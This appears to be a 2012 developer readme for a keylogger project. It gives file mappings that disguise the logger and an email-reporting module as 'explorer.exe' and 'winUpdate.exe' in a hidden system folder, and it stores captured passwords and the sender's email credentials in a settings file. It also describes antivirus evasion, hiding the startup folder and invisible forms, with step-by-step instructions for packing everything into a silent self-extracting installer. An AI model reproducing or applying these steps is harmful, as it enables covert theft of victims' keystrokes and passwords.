Revision 1.0.9
Date:17/10/2012 4:30PM
Changes:
1.Transparenting form with API function.
2.Removed small size frm placed at screen bottom.
3.Password Protected Package.zip with pwd = 10.

Keep folowing Folder tree and EXE's in this folder:
EXE's have been removed from Project files to prevent it from antivirus.

Generate EXE's from Project Locations and keep in Install before location.

Install before files			After Installation								'Location of Project Module
..\ControlPanel\Files\msex.text  	C:\Documents and Settings\Administrator\Application Data\System\explorer.exe	'nKLG_Final\MainKeylogger		'For creating Keylogs only
..\ControlPanel\Files\AS4T.CVF  	C:\Documents and Settings\Administrator\Application Data\System\winUpdate.exe	'nKLG_Final\SendEmailReport	'SendEmailReport
..\ControlPanel\Files\files.CAB		C:\Documents and Settings\Administrator\Application Data\System\cmsetacl.tmp"	'nKLG_Final\ControlPanel\Files	'Contains setting for send email, log location see below.
..\ControlPanel\Files\main.exe		C:\Documents and Settings\Administrator\Application Data\System\default.MCP"	'nKLG_Final\ControlPanel\Files	'Contains target titles.
..\ControlPanel\CPanel.exe		Anywhere, for user's access.							'nKLG_Final\ControlPanel		'Manages all above settings with GUI module.


File Strings order:
default.MCP:
Five titles.
Open ..\ControlPanel\Files\main.exe in notepad for help.

cmsetacl.tmp:
"Path to store passwords","Password","Comp_Name","SendEmailReportTo","sendFrom","FromPassword","If fails Retry after n minutes"

Note for Programmer:
explorer.exe Do not create above files automatically, if not found It stops working.
Log is encrypted with encCoce=20 only if password is not blank.
If Sender= "none" then email is not sent. No special setting.
Autorun on startup are exact location based settings. Stored nowhere. Program checks existance of shortcut in Startup Folder OR registry.
Program automatically hides Startup folder.
Forms hidden with "Transparent form" API functions. not me.hide


How to Build Package( Stand Alone Installation EXE )

1. Install winRAR
2. Select "Files" folder and "CPanel.exe" both. Right Click > Add to Archive.
3. Check "Create SFX Archive." Uncheck All other.
4. Advanced tab > SFX Options.. button
	i) > Text and icon tab.
	ii) At bottom choose icon for Stand Alone EXE. > OK
5. in Comment tab put comments as below.

;The comment below contains SFX script commands

Setup=CPanel.exe
TempMode
Silent=1
Overwrite=2
Update=U

; Comment Over